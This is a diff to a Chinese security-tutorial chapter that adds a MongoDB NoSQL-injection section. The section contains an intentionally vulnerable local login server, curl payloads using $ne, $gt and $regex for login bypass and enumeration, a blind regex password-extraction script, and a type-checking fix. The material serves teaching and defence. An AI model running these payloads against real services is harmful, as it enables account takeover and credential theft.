@@ -15,12 +15,12 @@ publish: true
 
 > [!info]- 章节信息
 > **所属方向**：Web 安全 ｜ **难度阶段**：L2 核心漏洞期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W01-Web安全导论与HTTP深化|W01]] · [[W02-工具链实战与靶场搭建|W02]]
-> **本章目标**：补齐零基础读者需要的 SQL 最小知识集；在自建靶场上完整走一遍注入的五类手法——联合查询、报错、布尔盲注、时间盲注、堆叠；掌握黑名单 WAF 的逐级绕过手法；会用 sqlmap 确认注入并拖库；知道防御该怎么写。
+> **本章目标**：补齐零基础读者需要的 SQL 最小知识集；在自建靶场上完整走一遍注入的五类手法——联合查询、报错、布尔盲注、时间盲注、堆叠；掌握黑名单 WAF 的逐级绕过手法；会用 sqlmap 确认注入并拖库；认识同一根因在文档数据库上的变体——MongoDB 操作符注入；知道防御该怎么写。
 
-11 章用 Python + sqlite3 做过万能密码的最小演示：输入拼进 SQL 的那一刻，数据就变成了代码。那一小节回答的是"注入为什么存在"；本章回答剩下的全部问题——注入到手之后能做什么、页面不回显时怎么办、有关键字过滤时怎么绕、什么时候交给 sqlmap、以及写出打不进的代码。全部实验在两套自建 PHP 靶场上进行，一套接 MariaDB，一套接 SQLite，靶场代码完整给出，读完即可在自己的终端里复现。
+11 章用 Python + sqlite3 做过万能密码的最小演示：输入拼进 SQL 的那一刻，数据就变成了代码。那一小节回答的是"注入为什么存在"；本章回答剩下的全部问题——注入到手之后能做什么、页面不回显时怎么办、有关键字过滤时怎么绕、什么时候交给 sqlmap、以及写出打不进的代码。全部实验在两套自建 PHP 靶场上进行，一套接 MariaDB，一套接 SQLite，靶场代码完整给出，读完即可在自己的终端里复现；第 10 节把同一根因搬到文档数据库上，那节的靶用 Python 标准库服务器承载。
 
 > [!note] 本章约定
-> 命令与输出成对给出，输出块标题写"输出："。所有 curl 统一加 `--noproxy '*'`：系统代理软件可能改写响应内容，该参数让 curl 直连目标。命令与输出按 PHP 8.5、MariaDB 11.8、sqlmap 1.10 编写，SQLite 为 3.46——版本差异主要影响报错文本的措辞，不影响手法本身。URL 里的空格写成 `%20`、单引号写成 `%27`、`#` 写成 `%23`，双引号内的 `&` 会截断参数，必须写 `%26`——后文的 payload 都遵守这套编码。
+> 命令与输出成对给出，输出块标题写"输出："。所有 curl 统一加 `--noproxy '*'`：系统代理软件可能改写响应内容，该参数让 curl 直连目标。命令与输出按 PHP 8.5、MariaDB 11.8、sqlmap 1.10 编写，SQLite 为 3.46——版本差异主要影响报错文本的措辞，不影响手法本身。URL 里的空格写成 `%20`、单引号写成 `%27`、`#` 写成 `%23`，双引号内的 `&` 会截断参数，必须写 `%26`——后文的 payload 都遵守这套编码。第 10 节的查询语义由 pymongo 兼容的 mongomock 4.3 承载（安装见该节），操作符的匹配规则与 MongoDB 一致，真实服务端的语法以官方文档为准。
 
 ## 1. SQL 最小必要集
 
@@ -1444,7 +1444,179 @@ available databases [3]:
 - **手法要和过滤级别配套**。把上面这条命令的 `level=4` 改成 `level=3`（and/or 过滤未开），双写残留没人还原，`INFoorrMATION_SCHEMA` 这种表名直接不存在，枚举全部失败——先摸清过滤器，再写 tamper；
 - **写 tamper 前先用单发 payload 在 Repeater 里试一遍**（[[11-Web安全版图与Burp#2.1 Burp Suite：中间人本尊|11 章 第 2 节]]的工作循环），确认每一级过滤的实际行为，比反复跑 sqlmap 快得多。
 
-## 10. 防御
+## 10. NoSQL 注入：MongoDB 操作符
+
+前 9 节的靶都是关系库；文档数据库换了一套查询语法，注入的根因没变——==数据被拼进了代码==。这一节以 MongoDB 为例看它换了什么形状。
+
+### 10.1 从拼字符串到拼对象
+
+SQL 注入的载体是字符串：输入拼进 SQL 文本，靠引号逃逸改变语义。MongoDB 的驱动里查询是一份**文档**（Python 里就是 dict）：`users.find_one({'user': u, 'pw': p})`——`u` 和 `p` 应该是字符串。问题出在 Web 应用常见的形状：请求体是 JSON，服务端 `json.loads` 之后把解析结果直接塞进查询。JSON 的值可以是对象，于是攻击者提交的不是 `"alice"` 而是 `{"$ne": "x"}`——`$ne`（not equal）是 MongoDB 的查询操作符，==解析后的 JSON 直接进了查询文档，数据就带着语法一起进去了==。不需要引号、不需要注释符，JSON 结构本身就是载体。
+
+验证环境：Ubuntu 的 apt 源里没有 MongoDB 服务器包，本节用 **mongomock** 承载查询语义——一个 pymongo 兼容的进程内实现，`find_one`、`$ne`、`$regex` 这些操作符的匹配规则与 MongoDB 一致，HTTP 形状与真实应用相同：
+
+```bash
+pip3 install --break-system-packages pymongo mongomock
+```
+
+登录靶（8406）：前端发 JSON，服务端解析后直接查询——漏洞正是"直接"这两个字：
+
+```python
+# mongo_login.py —— MongoDB 登录靶（8406）。用法: python3 mongo_login.py
+import json
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import mongomock
+
+client = mongomock.MongoClient()
+users = client.ctf.users
+users.insert_many([
+    {'user': 'alice', 'pw': 'alicepw', 'role': 'user'},
+    {'user': 'bob',   'pw': 'bobspw',  'role': 'user'},
+    {'user': 'admin', 'pw': 'y0ur_pw', 'role': 'admin'},
+])
+
+
+class H(BaseHTTPRequestHandler):
+    def _reply(self, text, code=200):
+        body = text.encode()
+        self.send_response(code)
+        self.send_header('Content-Type', 'application/json; charset=utf-8')
+        self.send_header('Content-Length', str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def do_POST(self):
+        if self.path != '/login':
+            return self._reply('{"error": "not found"}', 404)
+        n = int(self.headers.get('Content-Length', 0))
+        try:
+            body = json.loads(self.rfile.read(n).decode())
+        except json.JSONDecodeError:
+            return self._reply('{"error": "bad json"}', 400)
+        # 漏洞点：body 是解析后的 JSON 对象，user/pw 可能是 dict（操作符）而不是字符串
+        doc = users.find_one({'user': body.get('user'), 'pw': body.get('pw')})
+        if doc:
+            return self._reply(json.dumps({'ok': True, 'user': doc['user'], 'role': doc['role']}))
+        self._reply('{"ok": false, "msg": "wrong credentials"}', 401)
+
+
+HTTPServer(('127.0.0.1', 8406), H).serve_forever()
+```
+
+### 10.2 $ne 与 $gt：登录绕过
+
+正确的密码只有一个，`{"$ne": "x"}` 的语义是"不等于 x"——几乎任何密码都满足。先建立两态基线（对/错密码），再发操作符：
+
+```bash
+curl -s --noproxy '*' -d '{"user":"alice","pw":"alicepw"}' http://127.0.0.1:8406/login
+curl -s --noproxy '*' -w ' [%{http_code}]' -d '{"user":"alice","pw":"wrongpw"}' http://127.0.0.1:8406/login
+curl -s --noproxy '*' -d '{"user":"alice","pw":{"$ne":"x"}}' http://127.0.0.1:8406/login
+curl -s --noproxy '*' -d '{"user":{"$ne":""},"pw":{"$ne":""}}' http://127.0.0.1:8406/login
+curl -s --noproxy '*' -d '{"user":"admin","pw":{"$gt":""}}' http://127.0.0.1:8406/login
+curl -s --noproxy '*' -d '{"user":{"$regex":"^a"},"pw":{"$ne":""}}' http://127.0.0.1:8406/login
+```
+
+输出：
+
+```
+{"ok": true, "user": "alice", "role": "user"}
+{"ok": false, "msg": "wrong credentials"} [401]
+{"ok": true, "user": "alice", "role": "user"}
+{"ok": true, "user": "alice", "role": "user"}
+{"ok": true, "user": "admin", "role": "admin"}
+{"ok": true, "user": "alice", "role": "user"}
+```
+
+六发逐条读：正确密码登录；错误密码 401——服务端在验；第三发把 `pw` 换成 `{"$ne":"x"}`，登录成功，密码检查形同虚设；第四发 user 和 pw 双双不确定（非空串即可），命中文档顺序里的第一个用户；第五发 `$gt` 空串的语义是"大于空串"，任何非空字符串都成立，直接以 admin 登录；第六发 user 换成 `{"$regex":"^a"}`——正则匹配"a 开头的用户名"，这就是**用户名枚举**：改前缀试 `^b`、`^c`，存在的账号逐一现形。
+
+### 10.3 $regex 盲注：逐字符提取
+
+响应只有"登录成功/失败"一个比特时，操作符照样能把数据拖出来——与 5.2 节的布尔盲注同一思想，判定面从 SQL 条件换成了 `$regex` 前缀匹配：`{"pw": {"$regex": "^y"}}` 成功说明 admin 的密码以 y 开头，前缀逐位加长：
+
+```python
+# mongo_blind.py —— $regex 盲注提取 admin 密码。用法: python3 mongo_blind.py
+# 每次发 {"user":"admin","pw":{"$regex": "^已提取前缀+试探字符"}}，响应 ok 真假即判定面
+# re.escape 转义试探字符：$ ^ 等元字符直接拼进正则会变成锚（^y0ur_pw$ 恒真，提取永不停）
+import json
+import re
+import string
+import urllib.request
+
+URL = 'http://127.0.0.1:8406/login'
+CHARS = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_!@#$%^&*'
+
+known = ''
+while True:
+    hit = None
+    for c in CHARS:
+        body = json.dumps({'user': 'admin', 'pw': {'$regex': '^' + re.escape(known + c)}}).encode()
+        req = urllib.request.Request(URL, data=body, headers={'Content-Type': 'application/json'})
+        try:
+            with urllib.request.urlopen(req, timeout=5) as r:
+                ok = json.load(r).get('ok')
+        except urllib.error.HTTPError:
+            ok = False
+        if ok:
+            hit = c
+            break
+    if hit is None:
+        break
+    known += hit
+    print(f'[+] prefix = {known}')
+
+print(f'done: pw = {known}')
+```
+
+```bash
+python3 mongo_blind.py
+```
+
+输出：
+
+```
+[+] prefix = y
+[+] prefix = y0
+[+] prefix = y0u
+[+] prefix = y0ur
+[+] prefix = y0ur_
+[+] prefix = y0ur_p
+[+] prefix = y0ur_pw
+done: pw = y0ur_pw
+```
+
+响应面只有一比特，7 个字符十几毫秒一个全提出来——和 5.3 节的布尔盲注脚本逐行对应，只是查询语法换成了操作符。
+
+> [!info]- 盲注脚本里的正则元字符坑
+> 试探字符必须经 `re.escape` 转义。CHARS 里有 `$` 和 `^`，直接拼进去的话，前缀 `y0ur_pw` 加试探字符 `$` 得到正则 `^y0ur_pw$`——末尾的 `$` 是"行尾锚"，而密码恰好到此结束，这条正则恒真，脚本会在同一个位置无限循环。转义之后每个试探字符都按字面量匹配，前缀不再匹配时循环正常终止。真实 MongoDB 的 `$regex` 走 PCRE 语法，`\` 转义同样有效；服务端还接受 `$where`（执行 JavaScript）的旧写法，现代版本默认禁用，遇到旧实例值得一试。
+
+### 10.4 防御：类型校正
+
+==根因与 SQL 注入相同，防御也在同一侧：不让数据带语法进来==。SQL 用预处理，MongoDB 的等价物是**把查询参数钉死成标量类型**——解析后的 JSON 在进查询前逐字段校正：
+
+```python
+        # 修复：user/pw 只接受字符串，dict 一律拒绝
+        u, p = body.get('user'), body.get('pw')
+        if not isinstance(u, str) or not isinstance(p, str):
+            return self._reply('{"error": "bad request"}', 400)
+        doc = users.find_one({'user': u, 'pw': p})
+```
+
+校正之后重放本节的攻击，再回归一条正常登录：
+
+```bash
+curl -s --noproxy '*' -d '{"user":"alice","pw":{"$ne":"x"}}' http://127.0.0.1:8406/login
+curl -s --noproxy '*' -d '{"user":"alice","pw":"alicepw"}' http://127.0.0.1:8406/login
+```
+
+输出：
+
+```
+{"error": "bad request"}
+{"ok": true, "user": "alice", "role": "user"}
+```
+
+操作符对象落在 400 上，字符串照常登录。配套的两条常规工事：schema 校验库（pydantic 一类）在入口做类型约束，与手工 `isinstance` 等效且更成体系；数据库账号最小权限——本章 MariaDB 侧只读账号的思路原样适用。第 11 节的预处理与这里的类型校正是同一条原则的两副面孔：==查询的结构由代码定死，输入只提供值==。
+
+## 11. 防御
 
 SQL 注入的根因只有一个：==数据被拼进了代码==。对应的核心防御只有一个：预处理（参数化查询）。
 
@@ -1506,7 +1678,7 @@ curl -s --noproxy '*' "http://127.0.0.1:8408/?id=-1'%20union%20select%201,2,flag
 > [!note] 黑名单过滤不算防御
 > 第 8 节的全部绕过说明：关键字黑名单挡得住脚本小子，挡不住知道"双写、Tab、hex 字面量"的人。SQL 层的正解就是预处理，把"数据永远不当代码"变成结构保证；黑名单至多是纵深防御里的补充层。
 
-## 11. 常见问题
+## 12. 常见问题
 
 | 现象 | 原因与解决 |
 | ---- | ---- |
@@ -1526,8 +1698,12 @@ curl -s --noproxy '*' "http://127.0.0.1:8408/?id=-1'%20union%20select%201,2,flag
 | 带方括号的 payload 发不出请求 | curl 把裸 `[...]` 当 URL 通配展开。方括号写 `%5B` / `%5D`（7.3 节） |
 | PDO 代码按老资料"不能堆叠"排除了堆叠，堆叠却发生了 | PDO MySQL 默认开模拟预处理，默认配置可以堆叠；只有显式 `ATTR_EMULATE_PREPARES => false` 才禁掉（7.1 节） |
 | MariaDB 服务起不来 | WSL 里 `sudo service mariadb start`；仍失败看 `/var/log/mysql/error.log`，多为数据目录权限或端口占用 |
+| `pip3 install mongomock` 报 externally-managed-environment | 系统 Python 受保护：加 `--break-system-packages` 参数，或建虚拟环境再装（[[01-Linux环境与CTF实验环境搭建\|01 章]]的环境说明） |
+| `$regex` 盲注脚本在同一个前缀上停不下来 | 试探字符没转义：前缀加 `$` 拼出 `^y0ur_pw$`，末尾 `$` 成了恒真的行尾锚——`re.escape` 逐字符转义（[[#10.3 $regex 盲注：逐字符提取\|10.3]] 的折叠框） |
+| 操作符 payload 发出后回 400 | 靶子补了类型校正——这不是故障，是 [[#10.4 防御：类型校正\|10.4]] 防御生效的样子；确认靶子是哪个版本再选打法 |
+| mongomock 的行为和真实 MongoDB 对不上 | mongomock 保证常用操作符的语义一致，聚合管道与索引行为有差异；语法疑问以 MongoDB 官方文档为准（[[#13. 配套练习与延伸阅读\|13 节]]延伸阅读） |
 
-## 12. 配套练习与延伸阅读
+## 13. 配套练习与延伸阅读
 
 > [!note] 实战任务
 > 1. **完整复现**：按第 2 节从零搭起全部靶场，把 3–8 节的每一条命令亲手打一遍，要求不看正文说出每发 payload 在做什么。
@@ -1535,11 +1711,13 @@ curl -s --noproxy '*' "http://127.0.0.1:8408/?id=-1'%20union%20select%201,2,flag
 > 3. **升级 WAF**：给 WAF 靶加 level 6——同时删掉 Tab 和 `/**/`。用单发 payload 摸清新过滤器的行为，再决定 `%0a`、括号包裹还是别的分隔思路，把绕过写进 tamper 跑通 `--dbs`。
 > 4. **sqli-labs 通关**：[[11-Web安全版图与Burp#5. 打题流程：拿到题先看什么|11 章 第 5 节]]的靶场清单里 sqli-labs Less-1 到 Less-37，按"先手工、后 sqlmap"过掉前 20 关（[[13-Docker与赛题环境|13 章]]的 docker 直接拉起）。
 > 5. **审计视角**：回头读 11 章的九类漏洞表，标出哪些类型（上传、SSRF、反序列化）能和 SQL 注入组成利用链，写出每条链的前置条件。
+> 6. **NoSQL 复练**：给 `mongo_login.py` 补上 10.4 的类型校正，重放 10.2 的全部 payload 确认落到 400；再把盲注脚本的目标换成 `role` 字段（把判定条件从 `pw` 换到 `user` 的正则上），逐字符提取出 `admin` 的角色值。
 
 配套练习之外，按主题归档的延伸材料：
 
 - MariaDB 官方文档的 SQL 语句与函数参考（mariadb.com/kb）：`extractvalue`、`sleep`、`INTO OUTFILE`、`secure_file_priv` 的权威语义都在这里，方言疑问以此为准；
 - sqlmap 官方文档（sqlmap.org 的 Usage 一节）：`--technique`、`--level/--risk`、tamper 的完整选项与自带脚本库（`tamper/` 目录里 90 多个现成脚本，命名即用途，读几个就知道结构）；
-- PayloadsAllTheThings 的 SQL Injection 篇（GitHub）：按数据库与注入类型整理的 payload 速查，本章手法之外的变体（WAF 高级绕过、NoSQL 注入）从这里续；
+- PayloadsAllTheThings 的 SQL Injection 篇（GitHub）：按数据库与注入类型整理的 payload 速查，本章手法之外的 WAF 高级绕过从这里续；
+- MongoDB 官方文档的 Query Operators 一节（mongodb.com/docs）：`$ne`、`$gt`、`$regex`、`$where` 的权威语义，第 10 节的语法以此为准；
 - 工具与平台索引见 [[03-工具清单|08-资源索引·工具清单]] 与 [[01-练习平台索引|08-资源索引·练习平台]]；
 - 下一站：[[W05-命令注入与代码执行|W05]] 接本章 7.3 节的 getshell 之后——拿到命令执行还能做什么；[[W03-信息泄露与前端安全|W03]] 的报错页与注释泄露是本章报错注入的信息面前置。
